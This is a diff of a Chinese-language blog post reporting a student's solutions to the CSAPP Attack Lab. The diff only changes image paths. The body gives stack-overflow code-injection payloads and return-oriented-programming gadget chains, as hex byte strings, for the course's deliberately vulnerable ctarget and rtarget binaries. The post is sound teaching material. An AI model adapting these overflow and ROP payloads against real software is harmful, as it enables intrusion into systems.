@@ -23,16 +23,16 @@
 <meta property="og:site_name" content="Hexo">
 <meta property="og:description" content="Attack Lab ReportPart I: Code Injection Attacks前三个任务的基本原理都是将我们写的代码注入到栈中的某个区域中，然后通过栈溢出的方式使函数ret后执行去调用我们所写的指令。 Task1通过objdump -d命令获得 ctarget 文件的汇编代码，任务一很简单只需要将touch1的函数入口地址放到test函数的返回地址即可让它执行这段代码，查看ctar">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="http://example.com/2023/01/16/ICS-Attack-Lab-Report/pic/image-20221126133028927.png">
-<meta property="og:image" content="http://example.com/2023/01/16/ICS-Attack-Lab-Report/pic/image-20221126134409453.png">
-<meta property="og:image" content="http://example.com/2023/01/16/ICS-Attack-Lab-Report/pic/image-20221126141658981.png">
-<meta property="og:image" content="http://example.com/2023/01/16/ICS-Attack-Lab-Report/pic/image-20221126171228580.png">
-<meta property="og:image" content="http://example.com/2023/01/16/ICS-Attack-Lab-Report/pic/image-20221126174059768.png">
+<meta property="og:image" content="http://example.com/2023/01/16/ICS-Attack-Lab-Report/img/ICS/image-20221126133028927.png">
+<meta property="og:image" content="http://example.com/2023/01/16/ICS-Attack-Lab-Report/img/ICS/image-20221126134409453.png">
+<meta property="og:image" content="http://example.com/2023/01/16/ICS-Attack-Lab-Report/img/ICS/image-20221126141658981.png">
+<meta property="og:image" content="http://example.com/2023/01/16/ICS-Attack-Lab-Report/img/ICS/image-20221126171228580.png">
+<meta property="og:image" content="http://example.com/2023/01/16/ICS-Attack-Lab-Report/img/ICS/image-20221126174059768.png">
 <meta property="article:published_time" content="2023-01-16T03:20:40.000Z">
-<meta property="article:modified_time" content="2023-01-16T03:23:29.083Z">
+<meta property="article:modified_time" content="2023-01-16T03:25:33.926Z">
 <meta property="article:author" content="John Doe">
 <meta name="twitter:card" content="summary_large_image">
-<meta name="twitter:image" content="http://example.com/2023/01/16/ICS-Attack-Lab-Report/pic/image-20221126133028927.png">
+<meta name="twitter:image" content="http://example.com/2023/01/16/ICS-Attack-Lab-Report/img/ICS/image-20221126133028927.png">
   
   
   
@@ -283,7 +283,7 @@
 <h3 id="Task1"><a href="#Task1" class="headerlink" title="Task1"></a>Task1</h3><p>通过<code>objdump -d</code>命令获得 <code>ctarget</code> 文件的汇编代码，任务一很简单只需要将touch1的函数入口地址放到test函数的返回地址即可让它执行这段代码，查看<code>ctartget</code>中<code>getbuf</code>函数栈帧空间为18个字节，因此注入字符如下，</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs asm">00 00 00 00 00 00 00 00	#十八个字节的任意字符<br>00 00 00 00 00 00 00 00<br>00 00 00 00 00 00 00 00<br>f4 1c 40 00 00 00 00 00	#touch1的地址，小端在前<br></code></pre></td></tr></table></figure>
 <p>对应的栈帧构造如下</p>
-<p><img src="pic\image-20221126133028927.png" srcset="/img/loading.gif" lazyload alt="image-20221126133028927" style="zoom: 33%;" /></p>
+<p><img src="img\ICS\image-20221126133028927.png" srcset="/img/loading.gif" lazyload alt="image-20221126133028927" style="zoom: 33%;" /></p>
 <h3 id="Task2"><a href="#Task2" class="headerlink" title="Task2"></a>Task2</h3><p>这次不仅需要我们调用一个函数，还需要为该函数传参，设计思路为利用<code>getbuf</code>的栈帧空间注入为参数赋值并调用<code>touch2</code>的命令，然后让<code>test</code>栈帧的返回地址指向<code>getbuf</code>的栈顶，从而调用我们写好的代码，我们自己写的代码应该首先将cookie值传入rdi，再让rip指向<code>touch2</code>地址，可以通过<code>pushq</code>+<code>ret</code>的方式来实现。</p>
 <p>我们将需要注入的代码通过<code>objdump -r -D</code>反汇编得到二进制代码</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs asm">0:   48 c7 c7 6c f2 03 5b    mov    $0x5b03f26c,%rdi<br>7:   68 28 1d 40 00          pushq  $0x401d28<br>c:   c3                      retq <br></code></pre></td></tr></table></figure>
@@ -292,7 +292,7 @@
 <p>最终的注入字符如下：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs asm">48 c7 c7 6c #mov    $0x5b03f26c,%rdi<br>f2 03 5b 68 #pushq  $0x401d28<br>28 1d 40 00 c3 00 00 00 #retq <br>00 00 00 00 00 00 00 00<br>58 ed 65 55 00 00 00 00	#rsp地址<br></code></pre></td></tr></table></figure>
 <p>对应栈帧构造如下：</p>
-<p><img src="pic\image-20221126134409453.png" srcset="/img/loading.gif" lazyload alt="image-20221126134409453" style="zoom: 33%;" /></p>
+<p><img src="img\ICS\image-20221126134409453.png" srcset="/img/loading.gif" lazyload alt="image-20221126134409453" style="zoom: 33%;" /></p>
 <h3 id="Task3"><a href="#Task3" class="headerlink" title="Task3"></a>Task3</h3><p>与前两个任务不同之处在于，本题在<code>touch3</code>函数内调了<code>hexmatch</code>函数，该函数会随机在其栈帧内压入数据<code>char *s = cbuf + random() % 100;</code>，这就会导致我们送入的字符串可能被覆盖，数据可能会丢失，因此我们需要把它存到一个更安全的地方——test函数的栈帧中，通过gdb调试，我们得到其栈顶地址为5565ed78，此外还需要将cookie值转为对应字符串的16进制Ascii码值，转换结果为35 62 30 33 66 32 36 63。因此我们总设计思路为：</p>
 <ul>
 <li>cookie转化为16进制</li>
@@ -302,7 +302,7 @@
 <p>填入字符串如下</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs asm">48 c7 c7 78 ed 65 55 68	#movq    0x5565ed78, %rdi<br>4d 1e 40 00 c3 00 00 00	#pushq   0x401e4d 		ret<br>00 00 00 00 00 00 00 00<br>58 ed 65 55 00 00 00 00	#getbuf rsp<br>35 62 30 33 66 32 36 63	00#cookie字符串形式16进制ascii值<br></code></pre></td></tr></table></figure>
 <p>对应栈帧构造如下：</p>
-<p><img src="pic\image-20221126141658981.png" srcset="/img/loading.gif" lazyload alt="image-20221126141658981" style="zoom: 33%;" /></p>
+<p><img src="img\ICS\image-20221126141658981.png" srcset="/img/loading.gif" lazyload alt="image-20221126141658981" style="zoom: 33%;" /></p>
 <h2 id="Part-II-Return-Oriented-Programming"><a href="#Part-II-Return-Oriented-Programming" class="headerlink" title="Part II: Return-Oriented Programming"></a>Part II: Return-Oriented Programming</h2><p>根据writeup，接下来两个任务中由于设置栈随机化，我们不能像前面三个一样定位到精确地址插入代码。而为了实现攻击，我们需要从已经给定的代码中截取我们需要的代码序列，且这些序列以ret结尾。</p>
 <h3 id="Task4"><a href="#Task4" class="headerlink" title="Task4"></a>Task4</h3><p>本题的<code>touch2</code>函数和Task2相同，要求都是要为调用函数并传入参数，汇编代码为</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs asm">popq %rax<br>movq %rax,%rdi<br></code></pre></td></tr></table></figure>
@@ -312,7 +312,7 @@
 <p>其中<code>popq %rax</code>从401f22开始，<code>movq %rax,%rdi</code>从401f35开始，查找到touch2的入口地址后，最终注入的字符为</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs asm">00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00<br>22 1f 40 00 00 00 00 00	#popq %rax<br>6c f2 03 5b 00 00 00 00 #cookie<br>35 1f 40 00 00 00 00 00	#movq %rax,%rdi<br>28 1d 40 00 00 00 00 00	#touch2<br></code></pre></td></tr></table></figure>
 <p>对应栈帧构造如下：</p>
-<p><img src="pic\image-20221126171228580.png" srcset="/img/loading.gif" lazyload alt="image-20221126171228580" style="zoom: 33%;" /></p>
+<p><img src="img\ICS\image-20221126171228580.png" srcset="/img/loading.gif" lazyload alt="image-20221126171228580" style="zoom: 33%;" /></p>
 <h3 id="Task5"><a href="#Task5" class="headerlink" title="Task5"></a>Task5</h3><p>本任务的<code>touch3</code>函数和Task3相同，区别在于不能用绝对地址的方式定位test函数的栈顶，需要用偏移量的方式寻址。我们最终写的代码最终实现这样的功能：</p>
 <ul>
 <li>把rsp里的栈指针地址放到rdi</li>
@@ -326,7 +326,7 @@
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs asm">00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00<br>be 1f 40 00 00 00 00 00	#movq %rsp,%rax<br>0b 1f 40 00 00 00 00 00	#movq %rax,%rdi<br>22 1f 40 00 00 00 00 00	#popq %rax<br>48 00 00 00 00 00 00 00	#0x48<br>ea 1f 40 00 00 00 00 00	#movl %eax %edx<br>94 1f 40 00 00 00 00 00	#movl %edx %ecx<br>89 20 40 00 00 00 00 00	#movl %ecx %esi<br>5e 1f 40 00 00 00 00 00	#lea (%rdi,%rsi,1),%rax<br>0b 1f 40 00 00 00 00 00	#movq %rax,%rdi<br>4d 1e 40 00 00 00 00 00	#touch3<br>35 62 30 33 66 32 36 63	00	#cookie<br></code></pre></td></tr></table></figure>
 <p>其中偏移量0x48是根据<code>movq %rsp,%rax</code>到<code>cookie</code>字符串首地址之间的指令条数确定的，每条指令占8字节，共9条指令</p>
 <p>对应栈帧结构如下：</p>
-<p><img src="pic\image-20221126174059768.png" srcset="/img/loading.gif" lazyload alt="image-20221126174059768" style="zoom: 33%;" /></p>
+<p><img src="img\ICS\image-20221126174059768.png" srcset="/img/loading.gif" lazyload alt="image-20221126174059768" style="zoom: 33%;" /></p>
 <h2 id="感想和收获"><a href="#感想和收获" class="headerlink" title="感想和收获"></a>感想和收获</h2><p>相比协程lab，个人感觉这次的lab无论是在任务量还是难度上都相对友好，这既归公于助教和老师细致的准备工作和贴心的答疑，也得益于网上搜集到的大量相关教程，在本次实验完成的过程中，我主要参考了<a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/60724948">CSAPP实验之attack lab - 知乎 (zhihu.com)</a>和<a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/566309516">实验三：Attack-Lab - 知乎 (zhihu.com)</a>这两篇文章。</p>
 <p>在完成Task5时，我遇到了一定的困难，程序提示我输入了错误的指令，经过我的反复调试，发现最后问题出在某一条<code>movl</code>语句截取的时候没有关注后面跟着的字节使那条指令不在是我期待的<code>movl</code>含义，我后来找到了另一条更简单的语句来截取，成功解决了这个问题。</p>
 
